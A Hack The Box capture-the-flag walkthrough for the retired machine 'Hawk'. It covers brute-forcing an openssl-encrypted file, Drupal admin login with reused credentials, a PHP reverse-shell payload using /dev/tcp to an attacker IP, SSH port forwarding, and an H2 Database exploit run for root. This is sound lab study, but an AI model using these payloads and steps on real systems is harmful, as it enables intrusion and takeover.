---
layout: post
title: "Hack The Box: Hawk Walkthrough"
excerpt: "Hawk is a retired Linux machine of medium difficulty on Hack The Box"
---
# Metadata
## TCP 8082 H2 Database HTTP Console
Port `8082` is running `H2 Database HTTP Console` but is not configured to accept non-local connections. Maybe be a PrivEsc Vector later.![Metadata1]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata1.png){:style="display:block; margin-left:auto; margin-right:auto"}

## TCP 21 FTP
Port `21` is running `vsftpd 3.0.3` which also allows anonymous login identified by `nmap`. ![Metadata2]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata2.png){:style="display:block; margin-left:auto; margin-right:auto"}
- Run `wget -m --no-passive-ftp ftp://anonymous:@10.10.10.102` to retrieve all files readable by the `anonymous` user for further analysis. 
- There is a file named `.drupal.txt.enc`. Judging by the extension `.enc`, the file is likely protected by some form of symmetric encryption. The file content is base64-encoded. However, after running `cat .drupal.txt.enc | base64 -d > drupal.txt`, the file is indeed encrypted hinted by the `Salted__` keyword.![Metadata3]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata3.png){:style="display:block; margin-left:auto; margin-right:auto"}
	- According to my trusty friend `ChatGPT`, `Salted__` keyword is a characteristic of `openssl` encrypted file with cipher `AES-256-CBC`. There is also a [handy python script](https://github.com/HrushikeshK/openssl-bruteforce) for brute-forcing `openssl` encrypted file given a list of ciphers and passwords.
	- Retrieve the script, run `echo AES-256-CBC > candidate.txt;python2 brute.py /usr/share/wordlists/rockyou.txt candidate.txt ~/Desktop/10.10.10.102/messages/drupal.txt 2>/dev/null` to find out the secret key as `friends` along with the plaintext. From the plaintext, one can identify a  password `PencilKeyboardScanner123`.![Metadata4]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata4.png){:style="display:block; margin-left:auto; margin-right:auto"}

## TCP 80 Drupal CMS
Port `80` is running `Drupal CMS` which requires a pair of valid credential to perform further exploitation.
- With the information we gained from the `FTP` server. There is one possible pair of credential being `Daniel:PencilKeyboardScanner123` and preferably the user is an administrator but it is not the case here. However, it is always worth trying out some common administrator usernames such as `admin`, `administrator`, `root`, etc. Fortunately, `admin:PencilKeyboardScanner123` is a valid pair.![Metadata5]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata5.png){:style="display:block; margin-left:auto; margin-right:auto"}

## Enumeration as www-data
- Try running `su daniel` with `PencilKeyboardScanner123` did not work.
- Login credential for the MySQL database can be found in `settings.php` at `/var/www/html/sites/default`.![Metadata6]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata6.png){:style="display:block; margin-left:auto; margin-right:auto"}
	- Check if the password `drupal4hawk` is reused on the user `daniel` with `su daniel`. The output is quite bizarre. Instead of a normal shell, one gets a python shell. However running `import os;os.system("id")` can identify that one is running under the user context of `daniel`.![Metadata7]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata7.png){:style="display:block; margin-left:auto; margin-right:auto"}

## Enumeration as daniel
- Running `ps aux` can identify that previous inaccessible `H2 Database` is running under the privilege of the user `root` which make it the prime target for the final PrivEsc.![Metadata8]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata8.png){:style="display:block; margin-left:auto; margin-right:auto"}
	- However, in order to reach port `8082`, we need to perform port forwarding. Since we already got access to `daniel`'s password, we can simply, on attacking machine, run `ssh -v -N -L 8082:127.0.0.1:8082 daniel@10.10.10.102` with password `drupal4hawk` to perform port forward to access `H2 Database HTTP Console` at `http://127.0.0.1:8082`.

### Explore H2 Database Web Console
- Since we already got valid credential `drupal:drupal4hawk` for connecting to the `drupal` MySQL database, we can try it out here. After login, one  can identify the version number as `1.4.196`![Metadata9]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata9.png){:style="display:block; margin-left:auto; margin-right:auto"}![Metadata10]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata10.png){:style="display:block; margin-left:auto; margin-right:auto"}
- There are multiple `RCE` related to `H2 Database` but there is only one with matching version number.![Metadata11]({{ '/' | relative_url }}public/screenshots/Hawk/Metadata11.png){:style="display:block; margin-left:auto; margin-right:auto"}Upon further analysis, the exploit builds on top of the `'Alias' Arbitrary Code Execution` with an authentication bypass to create a database. Hence, we can actually opt for both potentially.

# Exploitation
## Shell as www-data
- Login as `admin` with password `PencilKeyboardScanner123`,  we can leverage [PHP filter module](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal#with-php-filter-module) to achieve remote code execution.
	- First, we need to go the modules section and enable PHP filter.![Exploitation1]({{ '/' | relative_url }}public/screenshots/Hawk/Exploitation1.png){:style="display:block; margin-left:auto; margin-right:auto"}
	- Now follow a sequence of actions to catch a reverse shell. 
		- On dashboard, hit `Add content`.
		- Select `Basic Page` or `Article`.
		- Write php shellcode on the body which, in my case, I used `<?php system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.92/443 0>&1'"); ?>`.
		- Select `PHP code` in Text format.
		- Before hitting save, make sure to spin up a listener to catch the incoming reverse shell.![Exploitation2]({{ '/' | relative_url }}public/screenshots/Hawk/Exploitation2.png){:style="display:block; margin-left:auto; margin-right:auto"}![Exploitation3]({{ '/' | relative_url }}public/screenshots/Hawk/Exploitation3.png){:style="display:block; margin-left:auto; margin-right:auto"}

## Shell as daniel
- Within the shell of `www-data`, run `su daniel` with the password `drupal4hawk`. With the python shell, run `import os;os.system("/bin/bash")` to get a working shell session.![Exploitation4]({{ '/' | relative_url }}public/screenshots/Hawk/Exploitation4.png){:style="display:block; margin-left:auto; margin-right:auto"}

# PrivEsc
- I'm going to use [H2 Database - 'Alias' Arbitrary Code Execution](https://www.exploit-db.com/exploits/44422)  since it is a verified exploit and I already had credentials. Run `searchsploit -m 44422` to retrieve the exploit.
- Run `python3 44422.py -H 127.0.0.1:8082 -d jdbc:h2:~/drupal -u drupal -p drupal4hawk` to get a semi-interactive web shell. Upgrading would be intuitive so I am going skip it.![PrivEsc1]({{ '/' | relative_url }}public/screenshots/Hawk/PrivEsc1.png){:style="display:block; margin-left:auto; margin-right:auto"}

# Beyond Root
- The weird shell that `daniel` gets is because the path to default shell is changed to `/usr/bin/python3` as shown in `/etc/passwd`.![Beyond-Root1]({{ '/' | relative_url }}public/screenshots/Hawk/Beyond-Root1.png){:style="display:block; margin-left:auto; margin-right:auto"}